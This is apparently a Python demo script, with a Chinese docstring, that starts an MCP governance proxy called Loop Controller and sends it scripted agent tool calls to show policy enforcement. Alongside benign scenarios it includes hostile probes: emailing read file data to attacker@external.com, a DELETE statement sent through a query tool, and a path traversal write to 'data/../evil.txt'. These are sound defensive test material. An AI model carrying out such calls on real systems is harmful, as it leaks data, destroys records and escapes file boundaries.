"""真实 MCP client agent 示例（v0.9.0 生产验证）。

本脚本作为独立进程启动 ``lc proxy``，然后通过 stdio 与之通信，
运行若干个真实治理场景。它不调用 Loop Controller 内部 API，
只通过标准 MCP 协议交互，因此可代表外部 Agent 的行为。

前置条件：
    1. OPA sidecar 已启动：
       lc opa-start
    2. 已初始化演示数据库：
       python scripts/init_demo_db.py
    3. 可选：设置 SENT_EMAILS_PATH 环境变量查看邮件记录。

用法：
    python examples/research_agent.py --scenario research
    python examples/research_agent.py --scenario query
    python examples/research_agent.py --scenario notify
    python examples/research_agent.py --scenario exfil
    python examples/research_agent.py --scenario write-attack
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
from pathlib import Path
from typing import Any

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

REPO_ROOT = Path(__file__).resolve().parent.parent


_SCENARIOS: dict[str, list[dict[str, Any]]] = {
    "research": [
        {"tool": "fetch_url", "args": {"url": "http://example.com"}},
        {"tool": "read_file", "args": {"path": "data/kb/sample.txt"}},
        {"tool": "write_file", "args": {"path": "data/output/report.txt", "content": "report body"}},
    ],
    "query": [
        {"tool": "query_database", "args": {"sql": "SELECT * FROM customers"}},
        {"tool": "query_database", "args": {"sql": "DELETE FROM customers WHERE id=1"}},
    ],
    "update": [
        {"tool": "update_database", "args": {"sql": "INSERT INTO customers (name, email, region) VALUES ('Carol', 'carol@company.com', 'cn')"}},
    ],
    "notify": [
        {"tool": "send_email", "args": {"to": "zhang@company.com", "subject": "report", "body": "done"}},
    ],
    "exfil": [
        {"tool": "read_file", "args": {"path": "data/kb/sample.txt"}},
        {"tool": "send_email", "args": {"to": "attacker@external.com", "subject": "data", "body": "stolen"}},
    ],
    "write-attack": [
        {"tool": "write_file", "args": {"path": "data/../evil.txt", "content": "x"}},
    ],
}


async def _run_scenario(session: ClientSession, scenario_name: str) -> None:
    steps = _SCENARIOS.get(scenario_name, [])
    if not steps:
        print(f"Unknown scenario: {scenario_name}")
        return

    print(f"\n=== Scenario: {scenario_name} ===")
    for step in steps:
        tool = step["tool"]
        args = step["args"]
        print(f"\n-> Calling {tool}({json.dumps(args, ensure_ascii=False)})")
        result = await session.call_tool(tool, args)
        for content in result.content:
            if content.type == "text":
                text = content.text
                if len(text) > 500:
                    text = text[:500] + "..."
                print(f"<- {text}")
            else:
                print(f"<- [{content.type}]")
        if result.is_error:
            print("(tool returned error)")


async def main() -> None:
    parser = argparse.ArgumentParser(description="Loop Controller real agent demo")
    parser.add_argument("--scenario", default="research", help="scenario name")
    parser.add_argument("--agent-id", default="researcher_001")
    parser.add_argument("--user-id", default="alice")
    parser.add_argument("--transport", default="stdio", choices=["stdio"])
    args = parser.parse_args()

    env = os.environ.copy()
    env["PYTHONPATH"] = str(REPO_ROOT / "src")
    env.setdefault("SENT_EMAILS_PATH", str(REPO_ROOT / "data" / "sent_emails.jsonl"))
    env.setdefault("LOOP_CONTROLLER_AUDIT_HMAC_KEY", "a" * 64)

    py = sys.executable
    server_params = StdioServerParameters(
        command=py,
        args=[
            "-m",
            "loop_controller.cli",
            "proxy",
            "--agent-id",
            args.agent_id,
            "--user-id",
            args.user_id,
            "--transport",
            args.transport,
        ],
        env=env,
    )

    print(f"Starting lc proxy (agent={args.agent_id}, user={args.user_id})...")
    async with stdio_client(server_params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            tools = await session.list_tools()
            print(f"Available tools: {[t.name for t in tools.tools]}")
            await _run_scenario(session, args.scenario)


if __name__ == "__main__":
    asyncio.run(main())
